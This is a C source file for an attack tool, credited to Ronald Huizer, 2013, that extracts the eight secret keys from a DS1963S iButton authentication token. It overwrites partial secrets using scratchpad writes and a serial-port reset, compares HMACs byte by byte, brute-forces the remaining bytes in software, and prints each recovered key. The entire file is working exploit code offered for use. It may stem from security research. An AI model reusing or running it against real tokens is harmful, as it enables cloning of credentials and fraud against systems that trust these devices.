/*
 *  ibutton-brute.c
 *
 *  A complexity reduction attack to uncover secret #0 on the iButton DS1963S.
 *
 *  -- Ronald Huizer, 2013
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "ds1963s.h"
#include "ds1963s-device.h"
#include "ibutton/ownet.h"
#include "ibutton/shaib.h"

#define SERIAL_PORT "/dev/ttyUSB0"

extern int fd[MAX_PORTNUM];

struct brutus_secret
{
	uint8_t		target_hmac[20];
	uint8_t		secret[8];
	uint8_t		secret_idx;
};

struct brutus
{
	struct ds1963s_client	ctx;
	struct ds1963s_device	dev;
	struct brutus_secret	secrets[8];
};

int brutus_init_secret(struct brutus *brute, int secret)
{
        struct ds1963s_read_auth_page_reply reply;
	int portnum = brute->ctx.copr.portnum;
	int addr;

	assert(secret >= 0 && secret <= 8);

	/* Calculate the address of this secret. */
	addr = ds1963s_client_page_to_address(secret);

	/* Erase the scratchpad. */
	EraseScratchpadSHA18(portnum, 0, 0);

	/* Read auth. page over the current scratchpad/data/etc. */
	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
		return -1;

	memcpy(brute->secrets[secret].target_hmac, reply.signature, 20);

	return 0;
}

int brutus_init_device(struct brutus *brute)
{
	struct ds1963s_client *ctx = &brute->ctx;
	struct ds1963s_rom rom;
	uint32_t counters[16];
	uint8_t buf[256];
	int i;

	/* Get the DS1963S serial number. */
	if (ds1963s_client_rom_get(ctx, &rom) == -1)
		return -1;

	/* We only support the DS1963S. */
	if (rom.family != 0x18)
		return -1;

	/* Get the write cycle counters. */
	if (ds1963s_write_cycle_get_all(ctx, counters) == -1)
		return -1;

	/* Get all non-write cycle counted data pages. */
	for (i = 0; i < 8; i++) {
		int r;

		r = ds1963s_client_memory_read(ctx, 32 * i, &buf[32 * i], 32);
		if (r == -1)
			return -1;
	}

	/* Initialize the software DS1963S implementation. */
	memset(&brute->dev, 0, sizeof brute->dev);
	brute->dev.family = rom.family;
	memcpy(brute->dev.serial, rom.serial, 6);
	memset(brute->dev.scratchpad, 0xFF, sizeof brute->dev.scratchpad);
	memcpy(brute->dev.data_memory, buf, sizeof buf);

	/* Initialize the write cycle counters. */
	for (i = 0; i < 8; i++) {
		brute->dev.data_wc[i]   = counters[i];
		brute->dev.secret_wc[i] = counters[i + 8];
	}

	return 0;
}

int brutus_init(struct brutus *brute)
{
	int i;

	/* Initialize the secrets we'll side-channel. */
	memset(brute->secrets, 0, sizeof brute->secrets);

	/* Initialize the DS1963S client. */
	if (ds1963s_client_init(&brute->ctx, SERIAL_PORT) == -1)
		return -1;

	/* Initialize the software implementation of the DS1963S. */
	if (brutus_init_device(brute) == -1) {
		ds1963s_client_destroy(&brute->ctx);
		return -1;
	}

	/* Calculate the target HMACs for all the secrets. */
	for (i = 0; i < 8; i++) {
		if (brutus_init_secret(brute, i) == -1) {
			ds1963s_client_destroy(&brute->ctx);
			return -1;
		}
	}

	return 0;
}

void brutus_perror(const char *s)
{
	if (s)
		fprintf(stderr, "%s: ", s);

	fprintf(stderr, "%s\n", owGetErrorMsg(owGetErrorNum()));
}

void brutus_destroy(struct brutus *brute)
{
	ds1963s_client_destroy(&brute->ctx);
}

/* Pulling down the RTS and DTR lines on the serial port for a certain
 * amount of time power-on-resets the iButton.
 */
void ibutton_hide_set(SHACopr *copr)
{
	int status = 0;

	if (ioctl(fd[copr->portnum], TIOCMSET, &status) == -1) {
		perror("ioctl():");
		exit(EXIT_FAILURE);
	}

	sleep(1);

	/* Release and reacquire the port. */
	owRelease(copr->portnum);

        if ( (copr->portnum = owAcquireEx(SERIAL_PORT)) == -1) {
		fprintf(stderr, "Failed to acquire port.\n");
		exit(EXIT_FAILURE);
	}

	/* Find the DS1963S iButton again, as we've lost it after a
	 * return to probe condition.
	 */
	if (FindNewSHA(copr->portnum, copr->devAN, TRUE) == FALSE) {
		fprintf(stderr, "No DS1963S iButton found.\n");
		exit(EXIT_FAILURE);
	}
}

void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, uint8_t *data, size_t len)
{
	SHACopr *copr = &ctx->copr;
	uint8_t buf[32];
	int secret_addr;
	int address;
	uint8_t es;

        if (secret < 0 || secret > 7) {
                fprintf(stderr, "Invalid secret page.\n");
                exit(EXIT_FAILURE);
        }

        secret_addr = 0x200 + secret * 8;

	if (len > 8) {
		fprintf(stderr, "Secret length should <= 8 bytes.\n");
		exit(EXIT_FAILURE);
	}

	if (EraseScratchpadSHA18(copr->portnum, 0, 0) == FALSE) {
		fprintf(stderr, "Error erasing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, 0, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, secret_addr, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (1).\n");
		exit(EXIT_FAILURE);
	}

	ibutton_hide_set(copr);

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (2).\n");
		owPrintErrorMsg(stdout);
		exit(EXIT_FAILURE);
	}

	if (CopyScratchpadSHA18(copr->portnum, secret_addr, len, 0) == FALSE) {
		fprintf(stderr, "Error copying scratchpad.\n");
		exit(EXIT_FAILURE);
	}
}

int brutus_do_one(struct brutus *brute, int num)
{
	struct brutus_secret *secret = &brute->secrets[num];
	int addr = ds1963s_client_page_to_address(num);
        struct ds1963s_read_auth_page_reply reply;
	SHACopr *copr = &brute->ctx.copr;

	ds1963s_secret_write_partial(
		&brute->ctx,		/* DS1963S context */
		num,			/* Secret number */
		secret->secret,		/* Partial secret to write */
		secret->secret_idx + 1	/* Length of the partial secret */
	);

	/* Erase the scratchpad. */
        EraseScratchpadSHA18(copr->portnum, 0, 0);

	/* Read auth. page over the current scratchpad/data/etc. */
	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1) {
		ibutton_perror("ds1963s_client_read_auth()");
		exit(EXIT_FAILURE);
	}

	/* Compare the current hmac with the target one. */
	if (!memcmp(secret->target_hmac, reply.signature, 20)) {
		/* We're done. */
		if (secret->secret_idx++ == 4)
			return 0;
	} else {
		/* Something went wrong. */
		if (secret->secret[secret->secret_idx]++ == 255)
			return -1;
	}

	/* More to come. */
	return 1;
}

void brutus_do_secret(struct brutus *brute, int num)
{
	struct brutus_secret *secret = &brute->secrets[num];
	int i, ret;

	do {
		printf("\rSecret #%d Trying: [", num);
		for (i = 0; i <= secret->secret_idx; i++)
			printf("%.2x", secret->secret[i]);
		for (i = secret->secret_idx + 1; i < 8; i++)
			printf("  ");
		printf("]");
		fflush(stdout);

		ret = brutus_do_one(brute, num);
	} while (ret == 1);

	printf("\n");

	if (ret == -1) {
		fprintf(stderr, "Something went wrong.\n");
		exit(EXIT_FAILURE);
	}

	/* Calculate the remaining 3 bytes in software. */
	memcpy(&brute->dev.secret_memory[num * 8], secret->secret, 5);
	for (i = 0; i < 0xFFFFFF; i++) {
		brute->dev.secret_memory[num * 8 + 5] = (i >>  0) & 0xFF;
		brute->dev.secret_memory[num * 8 + 6] = (i >>  8) & 0xFF;
		brute->dev.secret_memory[num * 8 + 7] = (i >> 16) & 0xFF;

		ds1963s_dev_read_auth_page(&brute->dev, num);

		if (!memcmp(secret->target_hmac, &brute->dev.scratchpad[8], 20))
			break;

		/* We need to erase the scratchpad again, as the device has
		 * stored the HMAC there.
		 */
		memset(brute->dev.scratchpad, 0xFF, 32);
	}

	printf("Key: ");
	for (i = 0; i < 8; i++)
		printf("%.2x", brute->dev.secret_memory[num * 8 + i]);
	printf("\n");
}

int main(int argc, char **argv)
{
	struct brutus brute;
	int i;

	if (brutus_init(&brute) == -1) {
		brutus_perror("brutus_init()");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < 8; i++) {
		printf("Secret #%d Target HMAC: ", i);
		ds1963s_client_hash_print(brute.secrets[i].target_hmac);
		brutus_do_secret(&brute, i);
	}

	brutus_destroy(&brute);
	exit(EXIT_SUCCESS);
}
